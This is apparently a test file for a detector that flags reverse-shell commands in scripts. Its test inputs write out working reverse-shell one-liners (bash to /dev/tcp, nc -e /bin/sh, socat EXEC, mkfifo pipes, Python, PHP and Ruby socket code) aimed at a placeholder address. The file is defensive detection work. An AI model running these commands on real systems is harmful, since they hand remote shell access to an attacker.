import { expect, test } from "bun:test";
import { slowdown } from "../../test-timing.ts";
import { reverseShell } from "./reverse-shell.ts";
import { shellStatements } from "./shell.ts";

const noProseContext = { afterProhibition: () => false, demoted: () => false };

const inScript = (...lines: string[]) => {
  const text = lines.join("\n");
  return reverseShell(text, shellStatements(text, false), noProseContext);
};

const severity = (line: string) => inScript(line)?.severity;

test("a shell wired to a socket is critical", () => {
  expect(inScript("bash -i >& /dev/tcp/192.0.2.1/1234 0>&1")).toEqual({
    severity: "critical",
    line: 1,
    detail: "bash -i >& /dev/tcp/192.0.2.1/1234",
  });
  expect(severity("exec 5<>/dev/udp/192.0.2.1/1234")).toBe("critical");
  expect(severity("nc -e /bin/sh 192.0.2.1 1234")).toBe("critical");
  expect(severity("nc -e '/bin/sh' 192.0.2.1 1234")).toBe("critical");
  expect(severity("ncat 192.0.2.1 1234 -c /bin/bash")).toBe("critical");
  expect(severity("mkfifo /tmp/f; cat /tmp/f | /bin/sh -i")).toBe("critical");
  expect(severity("socat TCP:192.0.2.1:1234 EXEC:true")).toBe("critical");
});

test("interpreter one-liners that open a socket or spawn a pty shell", () => {
  expect(
    severity(`python3 -c "import socket; s=socket.socket(); s.connect(('192.0.2.1',1234))"`),
  ).toBe("critical");
  expect(severity('pty.spawn("/bin/sh")')).toBe("critical");
  expect(severity(`php -r '$s=fsockopen("192.0.2.1",1234);'`)).toBe("critical");
  expect(severity(`ruby -rsocket -e 'TCPSocket.new("192.0.2.1",1234)'`)).toBe("critical");
  expect(severity("powershell -enc AAAAAAAAAAAAAAAAAAAAAAAA")).toBe("critical");
});

test("network tools without a shell are not a match", () => {
  expect(severity("nc -zv db.internal 5432")).toBeUndefined();
  expect(severity("socat TCP-LISTEN:8080,fork TCP:192.0.2.1:80")).toBeUndefined();
  expect(severity('python3 -c "import socket; print(socket.gethostname())"')).toBeUndefined();
  expect(severity("powershell -e short")).toBeUndefined();
});

test("a comment drops one level", () => {
  expect(severity("# bash -i >& /dev/tcp/192.0.2.1/1234 0>&1")).toBe("warn");
});

test("split quoting does not hide a command", () => {
  expect(severity("n'c' -e /bin/sh 192.0.2.1 1234")).toBe("critical");
  expect(severity(`"nc"at 192.0.2.1 1234 -c /bin/bash`)).toBe("critical");
});

test("a match quotes from the command to the last shell it reaches on the line", () => {
  expect(inScript("echo ok", "socat TCP:192.0.2.1:1 EXEC:sh,pty SYSTEM:id")).toEqual({
    severity: "critical",
    line: 2,
    detail: "socat TCP:192.0.2.1:1 EXEC:sh,pty SYSTEM:",
  });
  expect(inScript("nc -zv h 1 | nc h 2 -e /bin/sh -e /bin/bash")?.detail).toBe(
    "nc h 2 -e /bin/sh -e /bin/bash",
  );
  expect(severity("nc db.internal 5432 | grep -e /bin/sh")).toBeUndefined();
  expect(inScript("python3 -c 'import socket; s.connect((1)); s.connect((2))' # x")?.detail).toBe(
    "python3 -c 'import socket; s.connect((1)); s.connect(",
  );
});

// One long line of a pattern's first word, against the same text with one word per line.
const LONG = 5_000;
const longLine = (word: string) => `${word} `.repeat(LONG);
const shortLines = (word: string) => `${word}\n`.repeat(LONG);

test.each(["python -c socket", "socat", "mkfifo a", "php -r", "nc", "pwsh"])(
  "a long line of %p scans in linear time",
  (word) => {
    const { ratio, rounds } = slowdown(
      () => inScript(longLine(word)),
      () => inScript(shortLines(word)),
    );
    expect(ratio, rounds).toBeLessThan(3);
  },
);
